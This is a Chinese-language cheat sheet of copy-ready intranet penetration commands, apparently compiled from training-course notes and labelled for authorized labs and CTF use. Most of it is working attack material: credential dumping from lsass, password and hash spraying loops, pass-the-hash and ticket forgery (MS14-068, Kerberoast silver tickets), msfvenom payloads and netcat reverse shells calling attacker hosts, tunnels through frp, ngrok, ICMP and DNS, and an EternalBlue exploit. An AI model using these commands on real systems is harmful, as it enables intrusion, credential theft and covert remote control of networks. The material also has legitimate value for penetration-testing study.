# 内网横向速查

> 从 2026-08-30 ~ 09-02 的 8 篇内网安全学习笔记中抽取的**可复制命令速查**(cmd/powershell/mimikatz/kekeo/msf/CS/linux)。命令一律原样照抄笔记,不改写;同用途多变体都列出。⚠️ 仅供授权环境(靶场/CTF/授权渗透)测试。行尾来源简写见文末「来源笔记」。

## 信息收集

### 计算机基本信息(版本/补丁/服务/进程/任务)
- **查看系统全量信息(版本/补丁/主机名/域/网卡)**: `systeminfo` — 信息收集第一步,判断服务器角色 (源:08-30收集)
- **查看已启动服务**: `net start` (源:08-30收集)
- **查看进程列表**: `tasklist` (源:08-30收集)
- **查看计划任务**: `schtasks` (源:08-30收集)

### 网络与域环境判断
- **看 DNS 后缀/域名判断是否加域**: `ipconfig /all` (源:08-30收集)
- **列出域列表判断存在域**: `net view /domain` (源:08-30收集)
- **返回的域名就是主域/域控线索**: `net time /domain` — 报错有讲究:非域环境/找不到域控/权限不足各自报不同错 (源:08-30收集)
- **查看当前网络端口开放情况**: `netstat -ano` (源:08-30收集)
- **DNS 解析追踪来源地址**: `nslookup 域名` (源:08-30收集)

### 用户与权限信息
- **查看当前用户详细权限(含 SID,PTT 伪造前也要用)**: `whoami /all` (源:08-30收集)
- **查看登录信息**: `net config workstation` (源:08-30收集)
- **查看本地用户**: `net user` (源:08-30收集)
- **查看本地用户组**: `net localgroup` (源:08-30收集)
- **获取域用户信息**: `net user /domain` (源:08-30收集)
- **获取域用户组信息**: `net group /domain` (源:08-30收集)
- **查看域用户详细信息**: `wmic useraccount get /all` (源:08-30收集)
- **查询域管理员账户(Domain Admins)**: `net group "Domain Admins" /domain` (源:08-30收集)
- **查询企业管理员账户**: `net group "Enterprise Admins" /domain` (源:08-30收集)
- **查询域控制器账户**: `net group "Domain Controllers" /domain` (源:08-30收集)

### 凭据信息收集
- **查看 Windows 保存的所有 WIFI 配置**: `netsh wlan show profiles` — 凭据来源之一 (源:08-30收集)
- **导出指定 WIFI 明文密码(名称填上一步结果)**: `netsh wlan show profile name="无线名称" key=clear` — 浏览器/数据库备份/3389 与 ipc$ 连接记录等也是凭据来源清单 (源:08-30收集)

### 存活主机与域控探针
- **NetBIOS 扫描网段内主机**: `nbtscan 192.168.3.0/24` — 第三方工具 (源:08-30收集)
- **循环 ping 扫存活主机(系统自带,免第三方)**: `for /L %I in (1,1,254) DO @ping -w 1 -n 1 192.168.3.%I | findstr "TTL="` — 在 cmd 里跑,批处理文件里要写 %%I (源:08-30收集)
- **探针域控链路(先拿域名再解析再 ping)**: `net time /domain` → `nslookup` → `ping` — net time /domain 返回的域名 → nslookup 解析 → ping 拿 IP (源:08-30收集)

### nishang(PowerShell 脚本集)
- **导入 nishang 模块**: `Import-Module .\nishang.psm1` (源:08-30收集)
- **放开 PowerShell 执行策略(管理员)**: `Set-ExecutionPolicy RemoteSigned` (源:08-30收集)
- **查看模块内可用函数**: `Get-Command -Module nishang` (源:08-30收集)
- **获取常规计算机信息**: `Get-Information` (源:08-30收集)
- **端口扫描(起止地址段)**: `Invoke-PortScan -StartAddress 192.168.3.0 -EndAddress 192.168.3.100 -ResolveHost -ScanPort...` — 笔记里参数截图截断,完整语法待查 (源:08-30收集)

## 横向移动

### IPC 连接与文件复制(net use / copy / dir)
- **建立 IPC 链接(域内格式:域\用户)**: `net use \\192.168.3.21\ipc$ "Admin12345" /user:god.org\administrator` — 错误码速查:5=非管理员/51、53=网络路径问题/67=找不到网络名/1219=已建立过需先删/1326=账号密码错/1792=目标 NetLogon 未启动(连域控常见)/2242=密码过期 (源:08-30横向)
- **建立 IPC 链接(工作组:直接用户名)**: `net use \\server\ipc$ "password" /user:username` (源:08-30横向)
- **建立 IPC 链接(域内:域\用户名)**: `net use \\server\ipc$ "password" /user:domain\username` (源:08-30横向)
- **删除 IPC 链接(1219 报错时先删再连)**: `net use \\IP\ipc$ /del` (源:08-30横向)
- **查看目标共享**: `net view xx.xx.xx.xx` (源:08-30横向)
- **查看目标 C$ 文件列表(验证能否连上)**: `dir \\xx.xx.xx.xx\C$\` (源:08-30横向)
- **从目标下载文件到本地**: `copy \\xx.xx.xx.xx\C$\1.bat 1.bat` (源:08-30横向)
- **复制本地文件到目标**: `copy 1.bat \\xx.xx.xx.xx\C$\` (源:08-30横向)
- **删除与目标的连接**: `net use \\xx.xx.xx.xx\C$\1.bat /del` (源:08-30横向)

### at / schtasks 计划任务执行(官方自带)
- **拷贝执行脚本到目标 C 盘(at 流程)**: `copy add.bat \\192.168.3.21\c$` (源:08-30横向)
- **at 添加计划任务到点执行(Win <= 2012)**: `at \\192.168.3.21 15:47 c:\add.bat` — at 在 Win2012 起被弃用/移除,先 net time 看目标时间 (源:08-30横向)
- **建立 IPC 再打 2012+ 目标(schtasks 流程)**: `net use \\192.168.3.32\ipc$ "admin!@#45" /user:god.org\administrator` (源:08-30横向)
- **拷贝执行脚本到目标(schtasks 流程)**: `copy add.bat \\192.168.3.32\c$` (源:08-30横向)
- **schtasks 创建计划任务以 SYSTEM 身份执行(Win >= 2012 通用)**: `schtasks /create /s 192.168.3.32 /u god.org\administrator /p admin!@#45 /ru "SYSTEM" /tn adduser /sc ONCE /st 15:50 /tr "c:\add.bat"` — /s 目标 IP;/u+/p 凭据;/ru SYSTEM 最高权限;/tn 任务名;/sc ONCE 一次;/st 定在目标当前时间之后;/tr 要执行的程序;add.bat 里可写加用户/反弹后门 (源:08-30横向)

### atexec(impacket,一条命令自动化 at/计划任务)
- **明文执行命令(./=本地/当前域)**: `atexec.exe ./administrator:Admin12345@192.168.3.21 "whoami"` — 有回显,连 IPC+建计划任务+执行+清理一条龙 (源:08-30横向)
- **明文执行命令(显式指定域)**: `atexec.exe god/administrator:Admin12345@192.168.3.21 "whoami"` (源:08-30横向)
- **PTH 哈希传递执行命令(-hashes :NTLM哈希)**: `atexec.exe -hashes :ccf208c6485269c20db2cad21734fe7 ./administrator@192.168.3.21 "whoami"` — 拿不到明文时 mimikatz 掏的 hash 直接用 (源:08-30横向)

### 批量利用(FOR /F × 字典)
- **批量测 IP→明文连接(net use 无回显,看成功与否)**: `FOR /F %i in (ips.txt) do net use \\%i\ipc$ "admin!@#45" /user:administrator` (源:08-30横向)
- **批量测 IP→明文回显(atexec 有回显,能看到 whoami)**: `FOR /F %i in (ips.txt) do atexec.exe ./administrator:admin!@#45@%i whoami` (源:08-30横向)
- **固定 IP 轮询密码字典(明文)**: `FOR /F %i in (pass.txt) do atexec.exe ./administrator:%i@192.168.3.21 whoami` (源:08-30横向)
- **固定 IP 轮询 hash 字典(PTH 批量)**: `FOR /F %i in (hash.txt) do atexec.exe -hashes :%i ./administrator@192.168.3.21 whoami` (源:08-30横向)
- **业务账号横向(dbadmin 连 sqlserver)**: `net use \\192.168.3.32\ipc$ admin!@#45 /user:god\dbadmin` — 用户名也进字典:dbadmin/backup/test 等业务账号密码弱且可复用 (源:08-30横向)

### psexec(官方 Sysinternals + impacket 版,SMB 445)
- **先建 IPC 再 psexec 以 System 权限进 shell**: `net use \\192.168.3.32\ipc$ "admin!@#45" /user:administrator` → `psexec \\192.168.3.32 -s cmd` — 官方版不用免杀,前提 445 开放 (源:08-31SMB-WMI)
- **psexec 免建 IPC 直接明文账户密码**: `psexec \\192.168.3.21 -u administrator -p Admin12345 -s cmd` (源:08-31SMB-WMI)
- **impacket psexec PTH(本地/当前域)**: `psexec -hashes :$HASH$ ./administrator@10.1.2.3` — 非官方自带,容易被杀,需考虑免杀 (源:08-31SMB-WMI)
- **impacket psexec PTH(显式域)**: `psexec -hashes :$HASH$ domain/administrator@10.1.2.3` (源:08-31SMB-WMI)
- **impacket psexec PTH 实例**: `psexec -hashes :518b98ad4178a53695dc997aa02d455c ./administrator@192.168.3.32` (源:08-31SMB-WMI)

### smbexec(impacket,SMB 445)
- **明文执行(域内格式)**: `smbexec god/administrator:Admin12345@192.168.3.21` (源:08-31SMB-WMI)
- **明文执行(./=当前域/本地)**: `smbexec ./administrator:admin!@#45@192.168.3.32` (源:08-31SMB-WMI)
- **PTH(本地)**: `smbexec -hashes :$HASH$ ./admin@192.168.3.21` (源:08-31SMB-WMI)
- **PTH(域内,domain/admin 写法)**: `smbexec -hashes :$HASH$ domain/admin@192.168.3.21` (源:08-31SMB-WMI)
- **PTH 实例(本地)**: `smbexec -hashes :518b98ad4178a53695dc997aa02d455c ./administrator@192.168.3.32` (源:08-31SMB-WMI)
- **PTH 实例(域内)**: `smbexec -hashes :ccef208c6485269c20db2cad21734fe7 god/administrator@192.168.3.21` (源:08-31SMB-WMI)

### wmic / cscript+wmiexec.vbs(官方,WMI 135)
- **wmic 远程执行命令(无回显,输出重定向写目标文件)**: `wmic /node:192.168.3.21 /user:administrator /password:Admin12345 process call create "cmd.exe /c ipconfig >C:\1.txt"` — WMI 走 135 端口,不留日志较隐蔽;无回显就把结果 > 写到目标机文件再读回 (源:08-31SMB-WMI)
- **cscript 跑 wmiexec.vbs 进交互式 shell(有回显)**: `cscript //nologo wmiexec.vbs /shell 192.168.3.21 administrator Admin12345` — 格式:cscript //nologo wmiexec.vbs /shell 目标IP 用户 密码 (源:08-31SMB-WMI)

### wmiexec(impacket,WMI 135)
- **明文执行(本地/当前域,有回显)**: `wmiexec ./administrator:admin!@#45@192.168.3.32 "whoami"` (源:08-31SMB-WMI)
- **明文执行(域内)**: `wmiexec god/administrator:Admin12345@192.168.3.21 "whoami"` (源:08-31SMB-WMI)
- **PTH(本地)**: `wmiexec -hashes :518b98ad4178a53695dc997aa02d455c ./administrator@192.168.3.32 "whoami"` (源:08-31SMB-WMI)
- **PTH(域内)**: `wmiexec -hashes :ccef208c6485269c20db2cad21734fe7 god/administrator@192.168.3.21 "whoami"` (源:08-31SMB-WMI)

### RDP 横向(图形化,端口 3389)
- **明文密码图形登录**: `mstsc /v:IP` (源:09-01Kerberoast)
- **把凭据存入凭据管理器免输密码再连**: `cmdkey /add:IP /user:域\用户 /pass:密码` + `mstsc /v:IP` — cmdkey 需明文凭据 (源:09-01Kerberoast)
- **受限管理员模式连接(配合 mimikatz sekurlsa::pth)**: `mstsc /restrictedadmin` — 目标机注册表 HKLM\System\CurrentControlSet\Control\Lsa 的 DisableRestrictedAdmin=0;打了 KB2871997 后 PTH 仍可走 RDP 受限模式 (源:09-01Kerberoast)
- **会话劫持:把别人的桌面会话踢到自己终端**: `tscon <会话ID> /dest:<当前会话名>` — 需管理员/SYSTEM;先 query user 看会话 ID 与名字 (源:09-01Kerberoast)

## 哈希票据传递

### 凭据获取:Procdump + mimikatz 离线分析(wdigest 关闭后的取 hash 姿势)
- **dump lsass 全量内存(微软官方签名工具,免杀)**: `procdump -accepteula -ma lsass.exe lsass.dmp` — -accepteula 接受许可;-ma 全量 dump;mimikatz 本体易被杀,先 dump 回本地再离线分析 (源:08-31SMB-WMI)
- **mimikatz 载入 dump 文件离线分析**: `sekurlsa::minidump lsass.dmp` (源:08-31SMB-WMI)
- **离线提取明文/哈希(full 参数)**: `sekurlsa::logonPasswords full` — Win2012+/KB2871997 后常只能拿到 HASH 而非明文 (源:08-31SMB-WMI)

### PTH(pass the hash,mimikatz sekurlsa::pth)
- **用 NTLM hash 启动进程冒充域用户(域环境)**: `sekurlsa::pth /user:administrator /domain:god /ntlm:ccef208c6485269c20db2cad21734fe7` — 弹出 cmd,里面跑命令就是该用户;未打补丁时可用 (源:08-31PTH-PTK)
- **同上(工作组环境)**: `sekurlsa::pth /user:administrator /domain:workgroup /ntlm:518b98ad4178a53695dc997aa02d455c` — KB2871997 打补丁后普通用户 PTH 失效,只剩 administrator 的 hash 能 PTH (源:08-31PTH-PTK)

### PTK(pass the key,mimikatz AES key)
- **导出内存里的 AES 密钥(ekeys)**: `sekurlsa::ekeys` — 列出 aes256/aes128 key,PTK 的 key 来源 (源:08-31PTH-PTK)
- **用 aes256 key 传递(打补丁/禁 NTLM 环境)**: `sekurlsa::pth /user:mary /domain:god.org /aes256:d7c1d9310753a2f7f240e5b2701dc1e6177d16a6e40af3c5cdff814719821c4b` — 结构同 PTH,只把 /ntlm: 换 /aes256:;8.1/2012R2+ 及打补丁的 7/2008R2/8/2012 可用 PTK (源:08-31PTH-PTK)

### PTT-漏洞方式 MS14-068(普通域用户 → 域控 SYSTEM)
- **查看当前 SID(拿 S-1-5-21-xxx 值)**: `whoami /user` (源:08-31PTH-PTK)
- **清空当前机器所有 Kerberos 凭证**: `kerberos::purge` — 有域成员凭证会影响伪造 (源:08-31PTH-PTK)
- **确认凭证已清空**: `kerberos::list` (源:08-31PTH-PTK)
- **票据注入内存(ptc = pass the cache)**: `kerberos::ptc 票据文件` (源:08-31PTH-PTK)
- **MS14-068 生成伪造 TGT(模板)**: `ms14-068.exe -u 域成员名@域名 -s sid -d 域控制器地址 -p 域成员密码` — CVE-2014-6324,普通域用户伪造 TGT 冒充域管 (源:08-31PTH-PTK)
- **MS14-068 生成伪造 TGT(实例)**: `MS14-068.exe -u mary@god.org -s S-1-5-21-1218902331-2157346161-1782232778-1124 -d 192.168.3.21 -p admin!@#45` (源:08-31PTH-PTK)
- **把生成的 ccache 票据注入内存**: `mimikatz.exe "kerberos::ptc TGT_mary@god.org.ccache" exit` (源:08-31PTH-PTK)
- **查看当前票据列表**: `klist` (源:08-31PTH-PTK)
- **利用票据访问域控 C$**: `dir \\192.168.3.21\c$` — PTT 后访问目标要连主机名(DNS 名)而非 IP,Kerberos SPN 按主机名匹配,连 IP 认证失败 (源:08-31PTH-PTK)

### PTT-工具 kekeo(NTLM hash 换 TGT 票据)
- **kekeo 用 ntlm hash 申请 TGT 导出 .kirbi**: `kekeo "tgt::ask /user:mary /domain:god.org /ntlm:518b98ad4178a53695dc997aa02d455c"` — gentilkiwi 出品,适用有 hash 但禁 NTLM/想走 Kerberos 的场景 (源:08-31PTH-PTK)
- **mimikatz 导入 kekeo 生成的票据**: `kerberos::ptt TGT_mary@GOD.ORG_krbtgt~god.org@GOD.ORG.kirbi` (源:08-31PTH-PTK)
- **验证票据后访问目标**: `klist` → `dir \\192.168.3.21\c$` (源:08-31PTH-PTK)

### PTT-本地票据导出(复用机器上已有会话票据)
- **导出当前内存所有票据(.kirbi)**: `sekurlsa::tickets /export` — 需管理员/SYSTEM 权限(sekurlsa 模块要求) (源:08-31PTH-PTK)
- **注入导出的票据冒充身份**: `kerberos::ptt xxxxxxxxx.xxxx.kirbi` (源:08-31PTH-PTK)

## Kerberoast

### ① 探针与请求 SPN(setspn / PowerShell)
- **查询域内所有 SPN**: `setspn -q */*` — 找注册了 SPN 的服务账号(MSSQL/WSMAN/Exchange/TERMSERV/Hyper-V Host) (源:09-01Kerberoast)
- **过滤只找 MSSQL 服务的 SPN**: `setspn -q */* | findstr "MSSQL"` (源:09-01Kerberoast)
- **加载 .NET 身份模型程序集(PowerShell 请求 TGS 前置)**: `Add-Type -AssemblyName System.IdentityModel` (源:09-01Kerberoast)
- **请求目标 SPN 的服务票据 TGS(普通域用户即可)**: `New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "xxxx"` — xxxx 填目标 SPN,如 MSSQLSvc/Srv-DB-0day.0day.org:1433;请求免费,TGS 用服务账号 NTLM hash(RC4_HMAC_MD5)加密 → 拿回家离线爆破 (源:09-01Kerberoast)

### ② 导出与破解(mimikatz / tgsrepcrack)
- **mimikatz 直接向 KDC 请求目标 SPN 票据**: `mimikatz.exe "kerberos::ask /target:xxxx"` (源:09-01Kerberoast)
- **列出并导出票据(.kirbi 文件)**: `mimikatz.exe "kerberos::list /export"` (源:09-01Kerberoast)
- **tgsrepcrack 离线破解票据(模板)**: `python tgsrepcrack.py passwd.txt xxxx.kirbi` — 字典文件 + 导出的票据;RC4_HMAC_MD5 加密 TGS=服务账号 NTLM hash 加密,字典命中即得明文 (源:09-01Kerberoast)
- **tgsrepcrack 破解实例**: `python3 .\tgsrepcrack.py .\password.txt .\1-40a00000-jerry3@MSSQLSvc~Srv-DB-0day.0day.org~1433-0DAY.ORG.kirbi` — 票据文件名自带信息:账号 jerry3/服务 MSSQLSvc/主机/端口1433/域 0DAY.ORG (源:09-01Kerberoast)

### ③ 票据重写(kerberoast.py 银票据)
- **重写票据 PAC 为用户 RID 500(administrator)**: `python kerberoast.py -p Password123 -r xxxx.kirbi -w PENTESTLAB.kirbi -u 500` — 拿到服务账号密码后伪造银票据,-u 500=administrator (源:09-01Kerberoast)
- **重写票据 PAC 加入 Domain Admins 组(RID 512)**: `python kerberoast.py -p Password123 -r xxxx.kirbi -w PENTESTLAB.kirbi -g 512` — -g 512=Domain Admins,改完即以域管身份访问该服务 (源:09-01Kerberoast)
- **将重写后的票据注入内存**: `mimikatz.exe kerberos::ptt xxxx.kirbi` (源:09-01Kerberoast)

## CobaltStrike与MSF

### CS→MSF(beacon 派生 meterpreter 转交 MSF)
- **MSF 侧先开接收 handler**: `use exploit/multi/handler` (源:09-02CS联动)
- **设置接收 payload 类型**: `set payload windows/meterpreter/reverse_tcp` (源:09-02CS联动)
- **设置 MSF 机器监听 IP**: `set lhost <MSF 机器 IP>` (源:09-02CS联动)
- **设置监听端口**: `set lport <端口>` (源:09-02CS联动)
- **挂起等待会话**: `run` (源:09-02CS联动)
- **CS 端在已上线 beacon 上执行 Spawn(选择刚建的 Foreign 监听器)**: `spawn` — CS 先建 Foreign 监听器(Listeners → Add → Payload 选 windows/foreign/reverse_tcp),地址端口与 MSF handler 一致;beacon 派生子进程注入 stager 回连 MSF,MSF 侧 getsession 接手 (源:09-02CS联动)

### MSF→CS(payload_inject 把 MSF 会话注回 CS)
- **载入本地进程注入模块(课程命令)**: `use exploit/windows/local/payload_inject` — 在 MSF 已有会话的前提下用;属于本地提权目录下的注入模块,作用是塞 stager 不是提权 (源:09-02CS联动)
- **指定要注入的已有会话 ID**: `set session <已有会话 ID>` (源:09-02CS联动)
- **payload 类型与 CS 监听器对应**: `set payload windows/meterpreter/reverse_http` (源:09-02CS联动)
- **回连地址 = CS 服务器 IP**: `set lhost <CS 服务器 IP>` (源:09-02CS联动)
- **回连端口 = CS 监听端口**: `set lport <CS 监听端口>` (源:09-02CS联动)
- **执行注入回连(CS 侧等待上线)**: `run` — 方向相反时接收方先开监听:CS→MSF 是 MSF 先 handler、CS Spawn;MSF→CS 是 CS 先建监听器(HTTP/DNS 常规类型)、MSF payload_inject (源:09-02CS联动)

- **DNS 查询测试(Linux)**: `dig <域名>` — 哪层能出网就用哪层的隧道:只放 ICMP→ptunnel,DNS 53/udp 基本通杀 (源:09-02隧道)

### ngrok 免费穿透(两个内网互连)
- **内网被控侧启动 ngrok 客户端(sunny)连免费穿透服务商**: `./sunny clientid aa0676878c162ffc` — 服务商(ngrok.cc)给公网域名,流量经它转发 (源:09-01穿透代理)
- **生成反向 HTTP payload,lhost 填穿透服务的免费域名**: `msfvenom -p windows/meterpreter/reverse_http lhost=xiaodisec.free.idcfengye.com lport=80 -f exe -o test.exe` — 关键:lhost 填公网域名而不是真实 IP (源:09-01穿透代理)
- **MSF 接收端选择 handler**: `use exploit/multi/handler` (源:09-01穿透代理)
- **接收 payload 类型与生成时一致**: `set payload windows/meterpreter/reverse_http` (源:09-01穿透代理)
- **攻击机本地监听真实 IP**: `set lhost 192.168.76.132` (源:09-01穿透代理)
- **攻击机本地监听端口**: `set lport 4444` (源:09-01穿透代理)
- **启动监听等目标回连**: `exploit` (源:09-01穿透代理)

### frp 自建跳板(公网 VPS + frp 程序)
- **VPS 启动 frp 服务端**: `./frps -c ./frps.ini` — frps.ini 里 [common] bind_port=6677;云主机记得改安全组放行端口(出入口) (源:09-01穿透代理)
- **攻击机启动 frp 控制端**: `./frpc -c ./frpc.ini` — frpc.ini:[common] server_addr=<VPS公网IP> server_port=6677 remote_port=6000(服务端把 6000 转发给本机) (源:09-01穿透代理)
- **生成 reverse_tcp payload,lhost=公网 VPS IP、lport=remote_port**: `msfvenom -p windows/meterpreter/reverse_tcp lhost=101.37.160.211 lport=6000 -f exe -o frp.exe` (源:09-01穿透代理)
- **MSF 选择 handler**: `use exploit/multi/handler` (源:09-01穿透代理)
- **payload 类型对应**: `set payload windows/meterpreter/reverse_tcp` (源:09-01穿透代理)
- **本地监听 127.0.0.1(frpc 把 VPS 6000 转发到本机 5555)**: `set LHOST 127.0.0.1` (源:09-01穿透代理)
- **本地监听端口**: `set LPORT 5555` (源:09-01穿透代理)
- **启动监听**: `exploit` (源:09-01穿透代理)

### MSF 多层内网漫游(Target 反向/正向 shell + autoroute + socks4a)
- **生成反向后门(Target1 能出网)**: `msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.76.132 LPORT=1111 -f elf > t1.elf` (源:09-01穿透代理)
- **handler 接收反向 shell**: `use exploit/multi/handler` → `set payload linux/x64/meterpreter/reverse_tcp` → `set LHOST 192.168.76.132` → `set LPORT 1111` → `exploit` (源:09-01穿透代理)
- **生成正向后门(Target2 只能被特定网段访问,用 bind_tcp)**: `msfvenom -p linux/x64/meterpreter/bind_tcp LPORT=3333 -f elf > t2.elf` (源:09-01穿透代理)
- **handler 等目标把 shell 送上来(正向,rhost 填目标)**: `use exploit/multi/handler` → `set payload linux/x64/meterpreter/bind_tcp` → `set rhost 192.168.22.128` → `set LPORT 3333` → `exploit` (源:09-01穿透代理)
- **获取 Target2 网卡信息(发现更深网段)**: `run get_local_subnets` (源:09-01穿透代理)
- **查看当前路由**: `run autoroute -p` (源:09-01穿透代理)
- **把 33 段路由挂到当前 session(msf 内部路由)**: `run autoroute -s 192.168.33.0/24` (源:09-01穿透代理)
- **开启本地 socks 代理(让外部工具也能走 Target2)**: `use auxiliary/server/socks4a` (源:09-01穿透代理)
- **设置 socks 代理监听端口**: `set srvport 2222` (源:09-01穿透代理)
- **启动 socks 代理**: `exploit` — msf 模块走 autoroute 打 33 段,外部工具(nmap)走 socks 代理;Windows 侧可用 Proxifier/SocksCap64 载入该代理 (源:09-01穿透代理)
- **MS17-010 永恒之蓝模块打最深处 Target3**: `use exploit/windows/smb/ms17_010_psexec` (源:09-01穿透代理)
- **33 段只能正向(Target3 无法回连)**: `set payload windows/meterpreter/bind_tcp` (源:09-01穿透代理)
- **设置目标 IP**: `set RHOST 192.168.33.33` (源:09-01穿透代理)
- **执行漏洞利用**: `exploit` (源:09-01穿透代理)
- **进入系统 shell**: `shell` (源:09-01穿透代理)
- **递归找 flag 文件**: `dir /S flag.txt /B` (源:09-01穿透代理)

### proxychains 走代理扫描
- **proxychains 配置添加代理行(/etc/proxychains.conf)**: `socks4 192.168.76.132 2222` — proxychains 只代理 TCP;走代理时用 -sT(TCP connect),socks 不支持 SYN 半开扫描 (源:09-01穿透代理)
- **经代理扫 22 段(注意是 Target2 视角的网段)**: `proxychains4 nmap -sT -Pn 192.168.22.0/24 -p80` — -Pn 跳过主机发现(目标可能有过滤/防火墙) (源:09-01穿透代理)
- **经代理扫最深处 33 段目标**: `proxychains4 nmap -Pn -sT 192.168.33.33` (源:09-01穿透代理)

### ptunnel(网络层 ICMP 隧道)
- **目标机起隧道一端(只带密码,先起)**: `./ptunnel -x xiaodi` — 把 tcp/udp/socks5 流量伪装成 icmp,适合出口只放 ICMP 的场景;参数:-p 对端 IP/-lp 本地监听/-da 转发目标 IP/-dp 转发目标端口/-x 密码 (源:09-02隧道)
- **攻击机连 ICMP 隧道(把 33.33 的 3389 拉回本地 1080)**: `./ptunnel -p 192.168.76.150 -lp 1080 -da 192.168.33.33 -dp 3389 -x xiaodi` (源:09-02隧道)
- **本地连 1080 = 连目标内网 3389(rdesktop)**: `rdesktop 127.0.0.1 1080` (源:09-02隧道)

### lcx / portmap(传输层端口转发,win 用 lcx / linux 用 portmap)
- **被控内网机把本地 3389 主动外交给攻击机 IP 的 3131**: `lcx -slave 攻击IP 3131 127.0.0.1 3389` — -slave 主动外连,绕过入站过滤;内网机把 3389 交给攻击 IP 的 3131 (源:09-02隧道)
- **攻击机监听 3131 转发至 3333**: `lcx -listen 3131 3333` — 之后攻击机连自己 3333 即目标 3389 (源:09-02隧道)
- **双网卡中转机监听 2222 转发到 3333(多向连接跳板)**: `Lcx.exe -listen 2222 3333` — 场景:攻击机够不到 sqlserver(隔网段),用中间的 webserver(lcx)做转发跳板 (源:09-02隧道)

### netcat(传输层 TCP 隧道/反弹 shell/杂项)
- **正向反弹(受害机监听等攻击连,Linux)**: `nc -ldp 1234 -e /bin/sh` (源:09-02隧道)
- **正向反弹(受害机监听,Windows)**: `nc -ldp 1234 -e c:\windows\system32\cmd.exe` (源:09-02隧道)
- **攻击机主动连受害机拿 shell**: `nc 192.168.76.132 1234` (源:09-02隧道)
- **反向反弹(攻击机先监听)**: `nc -lvp 1234` (源:09-02隧道)
- **受害机主动外连攻击机(Linux)**: `nc 攻击主机IP 1234 -e /bin/sh` — 反向绕过 NAT/防火墙入站过滤 (源:09-02隧道)
- **受害机主动外连攻击机(Windows)**: `nc 攻击主机IP 1234 -e c:\windows\system32\cmd.exe` (源:09-02隧道)
- **sqlserver 把 cmd shell 反弹给中转机 webserver 的 2222**: `nc 192.168.3.31 2222 -e c:\windows\system32\cmd.exe` (源:09-02隧道)
- **攻击机连中转机 3333 拿 shell**: `nc -v 192.168.76.143 3333` (源:09-02隧道)
- **抓 banner 指纹服务**: `nc -nv 192.168.76.143` (源:09-02隧道)
- **端口扫描(-z 只探测不发送数据)**: `nc -v -z 192.168.76.143 1-100` (源:09-02隧道)
- **端口监听等待连接**: `nc -lvp xxxx` (源:09-02隧道)
- **文件传输(收端重定向 + 发端管道,两端配合)**: `nc -lp 1111 >1.txt | nc -vn xx.xx.x.x 1111 <1.txt -q 1` — -q 1 传完自动退出;两端执行顺序待实操验证 (源:09-02隧道)

### DNS 隧道配合 CS 上线(应用层,基本通杀)
- **CS beacon 立即回连(checkin)**: `beacon> checkin` (源:09-02隧道)
- **把 beacon 数据通道切成 DNS TXT 记录**: `beacon> mode dns-txt` — 上线后执行,后续命令/回显都编码进 DNS TXT 记录传出,绕过"只允许 DNS 出网"的边界监控;前置:云主机 Teamserver 监听 53/udp(启用 -udp),域名加 A 记录 cs.xiaodi8.com→CS服务器IP、NS 记录 ns1/ns2.xiaodi8.com→A 记录地址,CS Listeners 建 DNS 监听器填 ns1/ns2/cs.xiaodi8.com (源:09-02隧道)
- **DNS 隧道通了后正常执行命令(whoami 有回显)**: `beacon> shell whoami` (源:09-02隧道)
